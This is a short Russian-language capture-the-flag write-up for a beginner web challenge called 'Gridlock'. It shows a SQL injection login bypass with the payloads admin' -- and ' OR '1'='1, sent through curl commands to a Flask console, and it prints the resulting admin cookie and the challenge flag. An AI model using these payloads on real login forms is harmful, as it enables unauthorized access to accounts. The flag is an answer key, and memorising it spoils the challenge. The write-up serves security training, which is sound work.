# [Beginner] Gridlock

http://159.194.244.226:8081/ - консоль оператора «GRIDLOCK» на gunicorn/Flask.  
Форма логина, войти надо «как admin». Перебирать пароли не пришлось: в  
обработчике `/login` запрос к базе склеивается строкой, так что инжектятся оба  
поля. Обычный комментарийный обход:

```bash  
curl -i -c jar.txt -d "username=admin' --&password=x" \  
     http://159.194.244.226:8081/login  
# 302 Location: /console + сессионная кука Flask  
```

`--` закомментировал остаток запроса, проверка пароля отвалилась, и сервер вернул  
первую строку таблицы users - админа (uid=1, role=admin). Кука разбирается в  
`{"role":"admin","uid":1,"username":"admin"}`. Дальше просто открываю консоль с  
этой кукой:

```bash  
curl -b jar.txt http://159.194.244.226:8081/console  
# ... kubstu{gr1dl0ck_4dm1n_byp4ss_a59c3848}  
```

Из мелочей: `admin' #` не работает - `#` в SQLite не комментарий; в поле пароля  
срабатывает `' OR '1'='1`. Других зацепок на сервисе нет: `/admin`, `/api`,  
`/.git/HEAD` - 404, у `?lang=` ничего интересного, по времени ответа тоже всё  
ровно.

Флаг: `kubstu{gr1dl0ck_4dm1n_byp4ss_a59c3848}`
